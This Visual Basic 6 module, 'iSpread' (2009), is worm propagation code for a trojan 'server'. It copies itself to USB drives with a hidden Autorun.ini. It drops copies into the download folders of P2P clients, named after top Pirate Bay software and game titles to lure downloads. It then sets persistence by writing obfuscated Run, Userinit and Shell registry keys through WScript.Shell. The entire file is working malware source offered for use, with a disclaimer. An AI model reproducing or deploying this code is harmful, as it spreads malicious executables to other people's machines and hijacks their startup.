Attribute VB_Name = "Spread"
'**************************************************************************************
' Project : iSpread Module
' Usage   : Call Spread(True, True ,True) ' Boolean values changes depending what you want to spread, USB / P2P / Startup etc...
' Copyright (c) 2009 by Skyweb07 <skyweb09@hotmail.es>
'**************************************************************************************
' This software is used for Spread your server by diferent spread methods.
' The author is not responsible for the use you get to the tool;)
'**************************************************************************************

' <== REG APIS ==>

Public Enum Clave
HKEY_CURRENT_USER = &H80000001
HKEY_LOCAL_MACHINE = &H80000002
End Enum

Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

'**************************************************************************************

' <== Drives APIS ==>

Public Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Public Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function GetDiskFreeSpaceEx Lib "kernel32" Alias "GetDiskFreeSpaceExA" (ByVal lpDirectoryName As String, lpFreeBytesAvailableToCaller As Currency, lpTotalNumberOfBytes As Currency, lpTotalNumberOfFreeBytes As Currency) As Long

Public Const FILE_ATTRIBUTE_HIDDEN = &H2

'**************************************************************************************

' <== INI APIS ==>

Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Public Declare Function SetFileAttributes Lib "kernel32" Alias "SetFileAttributesA" (ByVal lpFileName As String, ByVal dwFileAttributes As Long) As Long

'**************************************************************************************

' <== Special Folders APIS ==>

Private Declare Function SHGetSpecialFolderLocation Lib "Shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, ByRef ppidl As Long) As Long
Private Declare Function SHGetPathFromIDList Lib "Shell32" (ByVal pidList As Long, ByVal lpBuffer As String) As Long
 
'**************************************************************************************

' <== Wininet APIS ==>

Private Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszUrl As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
Private Declare Function InternetReadFile Lib "wininet" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Private Declare Function InternetCloseHandle Lib "wininet" (ByVal hInet As Long) As Integer

'**************************************************************************************

Public Function Spread(USB As Boolean, P2P As Boolean, Startup As Boolean)

If USB = True Then Call USBX
If P2P = True Then Call P2PX
If Startup = True Then Call Bypass(App.Path & "\" & App.EXEName & ".exe")

End Function

Function USBX()

Dim sBuffer As String * 260, iGet As Integer, iDrive As String, iType As String

iGet = GetLogicalDriveStrings(Len(sBuffer), sBuffer)

If iGet = 0 Then Exit Function
iDrive = sBuffer
 
For i = 1 To 50

If Left$(sBuffer, InStr(1, sBuffer, Chr(0))) = Chr(0) Then Exit For

iDrive = Left(sBuffer, InStr(1, sBuffer, Chr(0)) - 1)

iType = GetDriveType(iDrive)

If iType = 2 Then

Call Complete(iDrive)

End If

sBuffer = Right(sBuffer, Len(sBuffer) - InStr(1, sBuffer, Chr(0)))

Next i

End Function

Function P2PX()

Dim YO As String, Temp As String, Ares As String, FrostWire As String, eMule As String, Bearshare As String
Dim Kazaa As String, Lphant As String, Bitcomet As String, Shareaza As String, Limewire As String
Dim Delimitador As String, sURL As String, sTemp() As String, sFolders As Variant, nFold As Variant

On Error Resume Next

YO = App.Path & "\" & App.EXEName & ".exe"

Ares = Hex2Ascii(ReadKey(HKEY_CURRENT_USER, "Software\Ares", "Download.Folder")) & "\"
Temp = Replace(Textoenmedio(FileOpen(SpecialF(26) & "\FrostWire\frostwire.props"), "DIRECTORY_FOR_SAVING_FILES=", vbNewLine), "\\", "\")
FrostWire = Left$(Temp, 1) & ":\" & Mid(Temp, 5, Len(Temp)) & "\"
eMule = Textoenmedio(FileOpen(SpecialF(38) & "\eMule\config\preferences.ini"), "IncomingDir=", vbNewLine) & "\"
Bearshare = ReadKey(HKEY_CURRENT_USER, "Software\BearShare\General", "DownloadDir") & "\"
Kazaa = ReadKey(HKEY_CURRENT_USER, "Software\Kazaa\LocalContent", "DownloadDir") & "\"
Lphant = ReadKey(HKEY_CURRENT_USER, "Software\Lphant\General", "DownloadDir") & "\"
Bitcomet = Textoenmedio(FileOpen(SpecialF(38) & "\BitComet\BitComet.xml"), "<DefaultDownloadPath>", "</DefaultDownloadPath>")
Shareaza = ReadKey(HKEY_CURRENT_USER, "Software\Shareaza\Shareaza\Downloads", "CompletePath") & "\"
Temp = Replace(Textoenmedio(FileOpen(SpecialF(26) & "\LimeWire\limewire.props"), "DIRECTORY_FOR_SAVING_FILES=", vbNewLine), "\\", "\")
Limewire = Left$(Temp, 1) & ":\" & Mid(Temp, 5, Len(Temp)) & "\"

sFolders = Array(Ares, FrostWire, eMule, Bearshare, Kazaa, Lphant, Bitcomet, Shareaza, Limewire)

sURL = Source("http://thepiratebay.org/top/301")

'http://thepiratebay.org/top/301 // Top Softwares
'http://thepiratebay.org/top/401 // Top Games

Delimitador = Textoenmedio(sURL, "searchResult", "</table></div>")
sTemp() = Split(Delimitador, "</tr>")

If UBound(sTemps) >= 1 Then

For i = 1 To UBound(sTemp)
 
For Each nFold In sFolders

If Exist(nFold, 0) = True Then

If Exist(nFold & Replace(Back(Textoenmedio(sTemp(i), "detLink", "</a></td>"), ">"), ".", "_") & ".exe", 1) = False Then

FileCopy YO, nFold & Replace(Back(Textoenmedio(sTemp(i), "detLink", "</a></td>"), ">"), ".", "_") & ".exe"

End If

End If

Next

Next i

End If

sURL = Source("http://thepiratebay.org/top/401")

Delimitador = Textoenmedio(sURL, "searchResult", "</table></div>")
sTemp() = Split(Delimitador, "</tr>")


If UBound(sTemps) >= 1 Then

For i = 1 To UBound(sTemp)
 
For Each nFold In sFolders

If Exist(nFold, 0) = True Then

If Exist(nFold & Replace(Back(Textoenmedio(sTemp(i), "detLink", "</a></td>"), ">"), ".", "_") & ".exe", 1) = False Then

FileCopy YO, nFold & Replace(Back(Textoenmedio(sTemp(i), "detLink", "</a></td>"), ">"), ".", "_") & ".exe"

End If

End If

Next

Next i

End If
 
End Function


Function Complete(Drive As String)

Dim YO As String
YO = App.Path & "\" & App.EXEName & ".exe"

If Exist(Drive & App.EXEName & ".exe", 1) = False And Freespace(Drive) = 1 Then
FileCopy YO, Drive & App.EXEName & ".exe"

Call WritePrivateProfileString("Autorun", "Open", App.EXEName & ".exe", Drive & "Autorun.ini")

SetFileAttributes Drive & App.EXEName & ".exe", FILE_ATTRIBUTE_HIDDEN
SetFileAttributes Drive & "Autorun.ini", FILE_ATTRIBUTE_HIDDEN

End If
End Function

Function Freespace(Disk As Variant) As String
Dim Status As Long, TotalBytes As Currency, FreeBytes As Currency, BytesAvailableToCaller As Currency

'http://support.microsoft.com/kb/202455

Freespace = GetDiskFreeSpaceEx(Disk, BytesAvailableToCaller, TotalBytes, FreeBytes)
End Function

Function Exist(sPath As Variant, sType As String)
Dim FS
Set FS = CreateObject("Scripting.FileSystemObject")
If sType = 1 Then
Exist = FS.fileexists(sPath)
Else
Exist = FS.folderexists(sPath)
End If
End Function
 
Function ReadKey(sKey As Clave, hSubKey As String, Value As String) As String
Dim lKey As Long, sBuffer As String

If RegOpenKey(sKey, hSubKey, lKey) = 0& Then
sBuffer = Space(512)
If RegQueryValueEx(lKey, Value, 0, 0, ByVal sBuffer, 512) = 0 Then
ReadKey = Left$(sBuffer, Len(sBuffer))
End If
Call RegCloseKey(lhKey)
End If

End Function

Function SpecialF(Number As Long) As String
Dim lRet As Long, Temp As String
If SHGetSpecialFolderLocation(0, Number, lRet) = 0& Then
Temp = Space$(260)
If SHGetPathFromIDList(lRet, Temp) Then
SpecialF = Left$(Temp, InStr(Temp, vbNullChar) - 1)
End If
End If
End Function

Function Source(URL As String) As String
Dim iOpen As Long, iFile As Long, Buffer As String, iRet As Long
Buffer = Space(1000)

iOpen = InternetOpen("Moxilla", 1, vbNullString, vbNullString, 0)
iFile = InternetOpenUrl(iOpen, URL, vbNullString, ByVal 0&, &H80000000, ByVal 0&)

Do
InternetReadFile iFile, Buffer, 1000, iRet
Source = Source & Left(Buffer, iRet)
If iRet = 0 Then Exit Do
Loop
    
InternetCloseHandle iFile
InternetCloseHandle iOpen
End Function

Public Function Textoenmedio(Texto As String, Delimitador1 As String, Delimitador2 As String)
On Error Resume Next
Textoenmedio = Left$(Mid$(Texto, InStr(Texto, Delimitador1) + Len(Delimitador1)), InStr(Mid$(Texto, InStr(Texto, Delimitador1) + Len(Delimitador1)), Delimitador2) - 1)
End Function

Public Function Hex2Ascii(ByVal Text As String) As String
    
For i = 1 To Len(Text)
    num = Mid(Text, i, 2)
    Value = Value & Chr(Val("&h" & num))
    i = i + 1
Next i

Hex2Ascii = Value
End Function

Function FileOpen(sFile As String) As String
If Exist(sFile, 1) = True Then

Dim sData As String

Open sFile For Binary As #1
sData = Space(LOF(1))
Get #1, , sData
Close #1

FileOpen = sData

End If
End Function

Function Back(Text As String, Char As String) As String
Dim resultado As String, posicionExt As Integer
posicionExt = InStrRev(Text, Char)
If posicionExt <> 0 Then
resultado = Right(Text, Len(Text) - posicionExt)
Else
resultado = ""
End If
Back = resultado
End Function


Public Function Bypass(sFile As String)
Dim x As Object
On Error Resume Next
Set x = CreateObject(StrReverse(Chr$(108) & Chr$(108) & Chr$(101) & Chr$(104) & Chr$(115) & Chr$(46) & Chr$(116) & Chr$(112) & Chr$(105) & Chr$(114) & Chr$(99) & Chr$(83) & Chr$(87)))
x.regwrite StrReverse(Chr$(110) & Chr$(117) & Chr$(82) & Chr$(92) & Chr$(110) & Chr$(111) & Chr$(105) & Chr$(115) & Chr$(114) & Chr$(101) & Chr$(86) & Chr$(116) & Chr$(110) & Chr$(101) & Chr$(114) & Chr$(114) & Chr$(117) & Chr$(67) & Chr$(92) & Chr$(115) & Chr$(119) & Chr$(111) & Chr$(100) & Chr$(110) & Chr$(105) & Chr$(87) & Chr$(92) & Chr$(116) & Chr$(102) & Chr$(111) & Chr$(115) & Chr$(111) & Chr$(114) & Chr$(99) & Chr$(105) & Chr$(77) & Chr$(92) & Chr$(101) & Chr$(114) & Chr$(97) & Chr$(119) & Chr$(116) & Chr$(102) & Chr$(111) & Chr$(83) & Chr$(92) & Chr$(85) & Chr$(67) & Chr$(75) & Chr$(72)), sFile
x.regwrite StrReverse(Chr$(116) & Chr$(105) & Chr$(110) & Chr$(105) & Chr$(114) & Chr$(101) & Chr$(115) & Chr$(85) & Chr$(92) & Chr$(110) & Chr$(111) & Chr$(103) & Chr$(111) & Chr$(108) & Chr$(110) & Chr$(105) & Chr$(87) & Chr$(92) & Chr$(110) & Chr$(111) & Chr$(105) & Chr$(115) & Chr$(114) & Chr$(101) & Chr$(86) & Chr$(116) & Chr$(110) & Chr$(101) & Chr$(114) & Chr$(114) & Chr$(117) & Chr$(67) & Chr$(92) & Chr$(84) & Chr$(78) & Chr$(32) & Chr$(115) & Chr$(119) & Chr$(111) & Chr$(100) & Chr$(110) & Chr$(105) & Chr$(87) & Chr$(92) & Chr$(116) & Chr$(102) & Chr$(111) & Chr$(115) & Chr$(111) & Chr$(114) & Chr$(99) & Chr$(105) & Chr$(77) & Chr$(92) & Chr$(69) & Chr$(82) & Chr$(65) & Chr$(87) & Chr$(84) & Chr$(70) & Chr$(79) & Chr$(83) & Chr$(92) & Chr$(77) & Chr$(76) & Chr$(75) & Chr$(72)), sFile
x.regwrite StrReverse(Chr$(108) & Chr$(108) & Chr$(101) & Chr$(104) & Chr$(83) & Chr$(92) & Chr$(110) & Chr$(111) & Chr$(103) & Chr$(111) & Chr$(108) & Chr$(110) & Chr$(105) & Chr$(87) & Chr$(92) & Chr$(110) & Chr$(111) & Chr$(105) & Chr$(115) & Chr$(114) & Chr$(101) & Chr$(86) & Chr$(116) & Chr$(110) & Chr$(101) & Chr$(114) & Chr$(114) & Chr$(117) & Chr$(67) & Chr$(92) & Chr$(84) & Chr$(78) & Chr$(32) & Chr$(115) & Chr$(119) & Chr$(111) & Chr$(100) & Chr$(110) & Chr$(105) & Chr$(87) & Chr$(92) & Chr$(116) & Chr$(102) & Chr$(111) & Chr$(115) & Chr$(111) & Chr$(114) & Chr$(99) & Chr$(105) & Chr$(77) & Chr$(92) & Chr$(69) & Chr$(82) & Chr$(65) & Chr$(87) & Chr$(84) & Chr$(70) & Chr$(79) & Chr$(83) & Chr$(92) & Chr$(77) & Chr$(76) & Chr$(75) & Chr$(72)), sFile
x.regwrite StrReverse(Chr$(110) & Chr$(117) & Chr$(82) & Chr$(92) & Chr$(110) & Chr$(111) & Chr$(105) & Chr$(115) & Chr$(114) & Chr$(101) & Chr$(86) & Chr$(116) & Chr$(110) & Chr$(101) & Chr$(114) & Chr$(114) & Chr$(117) & Chr$(67) & Chr$(92) & Chr$(115) & Chr$(119) & Chr$(111) & Chr$(100) & Chr$(110) & Chr$(105) & Chr$(87) & Chr$(92) & Chr$(116) & Chr$(102) & Chr$(111) & Chr$(115) & Chr$(111) & Chr$(114) & Chr$(99) & Chr$(105) & Chr$(77) & Chr$(92) & Chr$(69) & Chr$(82) & Chr$(65) & Chr$(87) & Chr$(84) & Chr$(70) & Chr$(79) & Chr$(83) & Chr$(92) & Chr$(77) & Chr$(76) & Chr$(75) & Chr$(72)), sFile
End Function


